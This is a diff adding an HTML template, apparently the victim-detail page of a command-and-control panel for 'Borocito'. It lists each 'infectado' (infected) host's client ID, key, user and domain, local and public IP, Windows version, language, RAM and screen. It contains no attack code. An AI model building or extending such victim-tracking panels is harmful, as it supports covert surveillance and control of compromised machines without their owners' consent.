@@ -1,0 +1,27 @@
+<div class="container mt-4">
+    <dl class="row">
+        <dt class="col-sm-3">Borocito-CLI</dt>
+        <dd class="col-sm-9">
+            <dl class="row">
+                <dd class="col-sm-9">{{ infectado.borocito }}</dd>
+                {% if infectado.key %}<dd class="col-sm-9">{{ infectado.key }}</dd>{% endif %}
+            </dl>
+        </dd>
+
+        <dt class="col-sm-3">Usuario @ Dominio</dt>
+        <dd class="col-sm-9">{{ infectado.username }} @ {{ infectado.domain }}</dd>
+
+        <dt class="col-sm-3">IP Local / IP Publica</dt>
+        <dd class="col-sm-9">{{ infectado.local_ip }} / {{ infectado.public_ip }}</dd>
+
+        <dt class="col-sm-3">Windows</dt>
+        <dd class="col-sm-9">
+            <dl class="row">
+                <dd class="col-sm-8">{{ infectado.windows }}</dd>
+                <dd class="col-sm-8">{{ infectado.language }}</dd>
+                <dd class="col-sm-8"><b>RAM</b> {{ infectado.ram }}</dd>
+                <dd class="col-sm-8"><b>Screen</b> {{ infectado.screen }}</dd>
+            </dl>
+        </dd>
+    </dl>
+</div>
